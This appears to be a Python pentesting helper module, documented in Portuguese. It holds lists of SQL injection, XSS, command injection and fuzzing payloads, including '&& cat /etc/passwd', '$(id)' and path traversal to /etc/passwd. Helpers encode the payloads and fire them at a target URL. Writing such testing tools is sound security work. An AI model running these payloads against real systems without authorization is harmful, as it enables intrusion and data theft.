import urllib.parse
import base64
import requests


def sql_injection_payloads():
    """
    Retorna uma lista de payloads comuns para testes de injeção SQL.
    """
    return [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin' /*",
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "1' OR '1'='1' #",
        "1' OR '1'='1' /*",
    ]

def xss_payloads():
    """
    Retorna uma lista de payloads comuns para testes de XSS.
    """
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
    ]

def command_injection_payloads():
    """
    Retorna uma lista de payloads comuns para testes de injeção de comandos.
    """
    return [
        "; ls -la",
        "&& cat /etc/passwd",
        "| whoami",
        "`id`",
        "$(id)",
        "|| ping -c 1 google.com",
    ]

def fuzzing_payloads():
    """
    Retorna uma lista de payloads para testes de fuzzing.
    """
    return [
        "A" * 1000,  # Buffer overflow simples
        "%n%n%n%n",  # Format string attack
        "../../../../etc/passwd",  # Path traversal
        "\x00",  # Null byte
        "\xFF\xFE\xFD",  # Bytes inválidos
    ]

def criar_payload(padrao, parametros):
    """
    Cria um payload personalizado com base em um padrão e parâmetros fornecidos.

    Parâmetros:
        padrao (str): Um padrão de string com placeholders (ex: "id={id}&nome={nome}").
        parametros (dict): Um dicionário com os valores para substituir os placeholders.

    Retorno:
        str: O payload gerado.
    """
    try:
        return padrao.format(**parametros)
    except KeyError as e:
        raise ValueError(f"Parâmetro faltando: {e}")

# Exemplo de uso
#padrao = "id={id}&nome={nome}&comando={comando}"
#parametros = {
#    "id": "1",
#    "nome": "admin",
#    "comando": "ls -la"
#}

#payload = criar_payload(padrao, parametros)
#print(payload)  # Saída: id=1&nome=admin&comando=ls -la

def gerar_fuzzing_payloads(tamanho_min=10, tamanho_max=1000, passo=100):
    """
    Gera payloads de fuzzing com strings de tamanhos variados.

    Parâmetros:
        tamanho_min (int): Tamanho mínimo do payload.
        tamanho_max (int): Tamanho máximo do payload.
        passo (int): Incremento de tamanho entre os payloads.

    Retorno:
        list: Lista de payloads de fuzzing.
    """
    payloads = []
    for tamanho in range(tamanho_min, tamanho_max + 1, passo):
        payloads.append("A" * tamanho)
    return payloads

# Exemplo de uso
#payloads = gerar_fuzzing_payloads(tamanho_min=100, tamanho_max=1000, passo=100)
#for payload in payloads:
#    print(payload)

def codificar_payload(payload, tipo="url"):
    """
    Codifica um payload no formato especificado.

    Parâmetros:
        payload (str): O payload a ser codificado.
        tipo (str): O tipo de codificação ("url", "base64").

    Retorno:
        str: O payload codificado.
    """
    if tipo == "url":
        return urllib.parse.quote(payload)
    elif tipo == "base64":
        return base64.b64encode(payload.encode()).decode()
    else:
        raise ValueError("Tipo de codificação não suportado.")

# Exemplo de uso
#payload = "id=1&nome=admin"
#print(codificar_payload(payload, tipo="url"))  # Saída: id%3D1%26nome%3Dadmin
#print(codificar_payload(payload, tipo="base64"))  # Saída: aWQ9MSZuYW1lPWFkbWlu

def testar_payloads(url, payloads):
    """
    Testa uma lista de payloads em uma URL.

    Parâmetros:
        url (str): A URL alvo.
        payloads (list): Lista de payloads para testar.

    Retorno:
        dict: Resultados dos testes.
    """
    resultados = {}
    for payload in payloads:
        try:
            resposta = requests.get(url + payload)
            resultados[payload] = {
                "status_code": resposta.status_code,
                "tamanho_resposta": len(resposta.text),
                "conteudo": resposta.text[:100]  # Mostra apenas os primeiros 100 caracteres
            }
        except Exception as e:
            resultados[payload] = {"erro": str(e)}
    return resultados

# Exemplo de uso
#url = "http://example.com/page?id="
#payloads = sql_injection_payloads()
#resultados = testar_payloads(url, payloads)
#for payload, resultado in resultados.items():
#    print(f"Payload: {payload}")
#    print(f"Resultado: {resultado}")